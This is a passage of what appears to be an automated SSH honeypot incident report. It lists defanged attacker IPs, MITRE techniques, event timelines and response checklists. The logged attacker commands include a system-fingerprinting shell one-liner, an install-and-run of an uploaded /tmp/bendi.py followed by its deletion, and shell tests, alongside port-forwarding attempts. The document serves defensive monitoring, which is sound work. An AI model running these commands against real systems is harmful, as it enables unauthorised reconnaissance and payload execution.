| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:13:21` | `cowrie.session.connect` |
| `2026-08-21 05:13:24` | `cowrie.client.version` |
| `2026-08-21 05:13:24` | `cowrie.client.kex` |
| `2026-08-21 05:13:30` | `cowrie.login.success` |
| `2026-08-21 05:13:31` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:13:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.28.237[.]90` to AbuseIPDB if not already reported
- [ ] Block `201.28.237[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26494d5531f0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 05:15 |
| **Last Seen** | 2026-08-21 05:15 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:15:38` | `cowrie.session.connect` |
| `2026-08-21 05:15:41` | `cowrie.client.version` |
| `2026-08-21 05:15:41` | `cowrie.client.kex` |
| `2026-08-21 05:15:49` | `cowrie.login.success` |
| `2026-08-21 05:15:54` | `cowrie.session.params` |
| `2026-08-21 05:15:54` | `cowrie.command.input` |
| `2026-08-21 05:15:54` | `cowrie.command.input` |
| `2026-08-21 05:15:54` | `cowrie.command.input` |
| `2026-08-21 05:15:54` | `cowrie.command.input` |
| `2026-08-21 05:15:54` | `cowrie.command.input` |
| `2026-08-21 05:15:54` | `cowrie.command.success` |
| `2026-08-21 05:15:54` | `cowrie.command.input` |
| `2026-08-21 05:15:54` | `cowrie.command.input` |
| `2026-08-21 05:15:54` | `cowrie.command.input` |
| `2026-08-21 05:15:54` | `cowrie.command.input` |
| `2026-08-21 05:15:56` | `cowrie.log.closed` |
| `2026-08-21 05:15:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f45ed06507be

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 05:17 |
| **Last Seen** | 2026-08-21 05:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:17:02` | `cowrie.session.connect` |
| `2026-08-21 05:17:02` | `cowrie.client.version` |
| `2026-08-21 05:17:02` | `cowrie.client.kex` |
| `2026-08-21 05:17:03` | `cowrie.login.success` |
| `2026-08-21 05:17:03` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:17:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 05:17:04` | `cowrie.direct-tcpip.data` |
| `2026-08-21 05:17:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a7d25ff8bb4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 05:17 |
| **Last Seen** | 2026-08-21 05:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:17:05` | `cowrie.session.connect` |
| `2026-08-21 05:17:05` | `cowrie.client.version` |
| `2026-08-21 05:17:05` | `cowrie.client.kex` |
| `2026-08-21 05:17:06` | `cowrie.login.success` |
| `2026-08-21 05:17:06` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:17:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 05:17:07` | `cowrie.direct-tcpip.data` |
| `2026-08-21 05:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c99d1d891a3

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-21 05:17 |
| **Last Seen** | 2026-08-21 05:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:17:29` | `cowrie.session.connect` |
| `2026-08-21 05:17:29` | `cowrie.client.version` |
| `2026-08-21 05:17:30` | `cowrie.client.kex` |
| `2026-08-21 05:17:30` | `cowrie.login.success` |
| `2026-08-21 05:17:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-462a412384ce

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-21 05:17 |
| **Last Seen** | 2026-08-21 05:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:17:30` | `cowrie.session.connect` |
| `2026-08-21 05:17:30` | `cowrie.client.version` |
| `2026-08-21 05:17:30` | `cowrie.client.kex` |
| `2026-08-21 05:17:31` | `cowrie.login.success` |
| `2026-08-21 05:17:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fda9e8f5d2c4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 05:19 |
| **Last Seen** | 2026-08-21 05:19 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:19:23` | `cowrie.session.connect` |
| `2026-08-21 05:19:24` | `cowrie.client.version` |
| `2026-08-21 05:19:24` | `cowrie.client.kex` |
| `2026-08-21 05:19:28` | `cowrie.login.success` |
| `2026-08-21 05:19:33` | `cowrie.session.params` |
| `2026-08-21 05:19:33` | `cowrie.command.input` |
| `2026-08-21 05:19:33` | `cowrie.command.input` |
| `2026-08-21 05:19:33` | `cowrie.command.input` |
| `2026-08-21 05:19:33` | `cowrie.command.input` |
| `2026-08-21 05:19:33` | `cowrie.command.input` |
| `2026-08-21 05:19:33` | `cowrie.command.success` |
| `2026-08-21 05:19:33` | `cowrie.command.input` |
| `2026-08-21 05:19:33` | `cowrie.command.input` |
| `2026-08-21 05:19:33` | `cowrie.command.input` |
| `2026-08-21 05:19:33` | `cowrie.command.input` |
| `2026-08-21 05:19:34` | `cowrie.log.closed` |
| `2026-08-21 05:19:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aabcbdb6c8e

| Field | Detail |
|---|---|
| **Source IP** | `85.105.2[.]51` |
| **First Seen** | 2026-08-21 05:20 |
| **Last Seen** | 2026-08-21 05:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:20:40` | `cowrie.session.connect` |
| `2026-08-21 05:20:40` | `cowrie.client.version` |
| `2026-08-21 05:20:40` | `cowrie.client.kex` |
| `2026-08-21 05:20:41` | `cowrie.login.success` |
| `2026-08-21 05:20:42` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:20:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.105.2[.]51` to AbuseIPDB if not already reported
- [ ] Block `85.105.2[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b566eab76ec

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-21 05:23 |
| **Last Seen** | 2026-08-21 05:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:23:17` | `cowrie.session.connect` |
| `2026-08-21 05:23:17` | `cowrie.client.version` |
| `2026-08-21 05:23:17` | `cowrie.client.kex` |
| `2026-08-21 05:23:17` | `cowrie.login.success` |
| `2026-08-21 05:23:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbb7d5f84ce4

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-21 05:23 |
| **Last Seen** | 2026-08-21 05:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:23:17` | `cowrie.session.connect` |
| `2026-08-21 05:23:17` | `cowrie.client.version` |
| `2026-08-21 05:23:17` | `cowrie.client.kex` |
| `2026-08-21 05:23:17` | `cowrie.login.success` |
| `2026-08-21 05:23:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dbc48841683

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-21 05:23 |
| **Last Seen** | 2026-08-21 05:25 |
| **Session Duration** | 127s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:23:23` | `cowrie.session.connect` |
| `2026-08-21 05:23:23` | `cowrie.client.version` |
| `2026-08-21 05:23:23` | `cowrie.client.kex` |
| `2026-08-21 05:23:24` | `cowrie.login.success` |
| `2026-08-21 05:23:25` | `cowrie.session.file_upload` |
| `2026-08-21 05:23:26` | `cowrie.session.params` |
| `2026-08-21 05:23:26` | `cowrie.command.input` |
| `2026-08-21 05:23:26` | `cowrie.command.input` |
| `2026-08-21 05:23:26` | `cowrie.command.input` |
| `2026-08-21 05:23:26` | `cowrie.command.failed` |
| `2026-08-21 05:23:26` | `cowrie.log.closed` |
| `2026-08-21 05:23:26` | `cowrie.session.params` |
| `2026-08-21 05:23:26` | `cowrie.command.input` |
| `2026-08-21 05:23:26` | `cowrie.log.closed` |
| `2026-08-21 05:23:27` | `cowrie.session.params` |
| `2026-08-21 05:23:27` | `cowrie.command.input` |
| `2026-08-21 05:23:27` | `cowrie.log.closed` |
| `2026-08-21 05:23:28` | `cowrie.session.params` |
| `2026-08-21 05:23:28` | `cowrie.command.input` |
| `2026-08-21 05:23:28` | `cowrie.command.failed` |
| `2026-08-21 05:23:28` | `cowrie.command.failed` |
| `2026-08-21 05:24:29` | `cowrie.session.params` |
| `2026-08-21 05:24:29` | `cowrie.command.input` |
| `2026-08-21 05:25:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9912eab3d04

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 05:23 |
| **Last Seen** | 2026-08-21 05:23 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:23:26` | `cowrie.session.connect` |
| `2026-08-21 05:23:27` | `cowrie.client.version` |
| `2026-08-21 05:23:27` | `cowrie.client.kex` |
| `2026-08-21 05:23:35` | `cowrie.login.success` |
| `2026-08-21 05:23:38` | `cowrie.session.params` |
| `2026-08-21 05:23:38` | `cowrie.command.input` |
| `2026-08-21 05:23:38` | `cowrie.command.input` |
| `2026-08-21 05:23:38` | `cowrie.command.input` |
| `2026-08-21 05:23:38` | `cowrie.command.input` |
| `2026-08-21 05:23:38` | `cowrie.command.input` |
| `2026-08-21 05:23:38` | `cowrie.command.success` |
| `2026-08-21 05:23:38` | `cowrie.command.input` |
| `2026-08-21 05:23:38` | `cowrie.command.input` |
| `2026-08-21 05:23:38` | `cowrie.command.input` |
| `2026-08-21 05:23:38` | `cowrie.command.input` |
| `2026-08-21 05:23:40` | `cowrie.log.closed` |
| `2026-08-21 05:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9b2b06269ab

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-21 05:25 |
| **Last Seen** | 2026-08-21 05:27 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:25:30` | `cowrie.session.connect` |
| `2026-08-21 05:25:30` | `cowrie.client.version` |
| `2026-08-21 05:25:30` | `cowrie.client.kex` |
| `2026-08-21 05:25:31` | `cowrie.login.success` |
| `2026-08-21 05:25:32` | `cowrie.session.file_upload` |
| `2026-08-21 05:25:32` | `cowrie.session.params` |
| `2026-08-21 05:25:32` | `cowrie.command.input` |
| `2026-08-21 05:25:32` | `cowrie.command.input` |
| `2026-08-21 05:25:32` | `cowrie.command.input` |
| `2026-08-21 05:25:32` | `cowrie.command.failed` |
| `2026-08-21 05:25:32` | `cowrie.log.closed` |
| `2026-08-21 05:25:33` | `cowrie.session.params` |
| `2026-08-21 05:25:33` | `cowrie.command.input` |
| `2026-08-21 05:25:33` | `cowrie.log.closed` |
| `2026-08-21 05:25:34` | `cowrie.session.params` |
| `2026-08-21 05:25:34` | `cowrie.command.input` |
| `2026-08-21 05:25:34` | `cowrie.log.closed` |
| `2026-08-21 05:25:35` | `cowrie.session.params` |
| `2026-08-21 05:25:35` | `cowrie.command.input` |
| `2026-08-21 05:25:35` | `cowrie.command.failed` |
| `2026-08-21 05:25:35` | `cowrie.command.failed` |
| `2026-08-21 05:26:36` | `cowrie.session.params` |
| `2026-08-21 05:26:36` | `cowrie.command.input` |
| `2026-08-21 05:27:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2a534a66f2c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 05:26 |
| **Last Seen** | 2026-08-21 05:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:26:49` | `cowrie.session.connect` |
| `2026-08-21 05:26:49` | `cowrie.client.version` |
| `2026-08-21 05:26:49` | `cowrie.client.kex` |
| `2026-08-21 05:26:50` | `cowrie.login.success` |
| `2026-08-21 05:26:50` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:26:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 05:26:50` | `cowrie.direct-tcpip.data` |
| `2026-08-21 05:26:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4856bbb83eef

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 05:26 |
| **Last Seen** | 2026-08-21 05:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:26:52` | `cowrie.session.connect` |
| `2026-08-21 05:26:52` | `cowrie.client.version` |
| `2026-08-21 05:26:52` | `cowrie.client.kex` |
| `2026-08-21 05:26:54` | `cowrie.login.success` |
| `2026-08-21 05:26:54` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:26:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 05:26:54` | `cowrie.direct-tcpip.data` |
| `2026-08-21 05:26:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae36248cb9a6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 05:27 |
| **Last Seen** | 2026-08-21 05:27 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:27:29` | `cowrie.session.connect` |
| `2026-08-21 05:27:31` | `cowrie.client.version` |
| `2026-08-21 05:27:31` | `cowrie.client.kex` |
| `2026-08-21 05:27:39` | `cowrie.login.success` |
| `2026-08-21 05:27:43` | `cowrie.session.params` |
| `2026-08-21 05:27:43` | `cowrie.command.input` |
| `2026-08-21 05:27:43` | `cowrie.command.input` |
| `2026-08-21 05:27:43` | `cowrie.command.input` |
| `2026-08-21 05:27:43` | `cowrie.command.input` |
| `2026-08-21 05:27:43` | `cowrie.command.input` |
| `2026-08-21 05:27:43` | `cowrie.command.success` |
| `2026-08-21 05:27:43` | `cowrie.command.input` |
| `2026-08-21 05:27:43` | `cowrie.command.input` |
| `2026-08-21 05:27:43` | `cowrie.command.input` |
| `2026-08-21 05:27:43` | `cowrie.command.input` |
| `2026-08-21 05:27:45` | `cowrie.log.closed` |
| `2026-08-21 05:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad6ae312d83d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:29 |
| **Last Seen** | 2026-08-21 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:29:31` | `cowrie.session.connect` |
| `2026-08-21 05:29:31` | `cowrie.client.version` |
| `2026-08-21 05:29:31` | `cowrie.client.kex` |
| `2026-08-21 05:29:31` | `cowrie.login.success` |
| `2026-08-21 05:29:32` | `cowrie.session.params` |
| `2026-08-21 05:29:32` | `cowrie.command.input` |
| `2026-08-21 05:29:32` | `cowrie.log.closed` |
| `2026-08-21 05:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d65ae54dca1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:29 |
| **Last Seen** | 2026-08-21 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:29:32` | `cowrie.session.connect` |
| `2026-08-21 05:29:32` | `cowrie.client.version` |
| `2026-08-21 05:29:32` | `cowrie.client.kex` |
| `2026-08-21 05:29:32` | `cowrie.login.success` |
| `2026-08-21 05:29:33` | `cowrie.session.params` |
| `2026-08-21 05:29:33` | `cowrie.command.input` |
| `2026-08-21 05:29:33` | `cowrie.log.closed` |
| `2026-08-21 05:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71aa895cb4b3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:29 |
| **Last Seen** | 2026-08-21 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:29:33` | `cowrie.session.connect` |
| `2026-08-21 05:29:33` | `cowrie.client.version` |
| `2026-08-21 05:29:33` | `cowrie.client.kex` |
| `2026-08-21 05:29:34` | `cowrie.login.success` |
| `2026-08-21 05:29:35` | `cowrie.session.params` |
| `2026-08-21 05:29:35` | `cowrie.command.input` |
| `2026-08-21 05:29:35` | `cowrie.log.closed` |
| `2026-08-21 05:29:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cf0eca1834c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:29 |
| **Last Seen** | 2026-08-21 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:29:35` | `cowrie.session.connect` |
| `2026-08-21 05:29:35` | `cowrie.client.version` |
| `2026-08-21 05:29:35` | `cowrie.client.kex` |
| `2026-08-21 05:29:35` | `cowrie.login.success` |
| `2026-08-21 05:29:36` | `cowrie.session.params` |
| `2026-08-21 05:29:36` | `cowrie.command.input` |
| `2026-08-21 05:29:36` | `cowrie.log.closed` |
| `2026-08-21 05:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
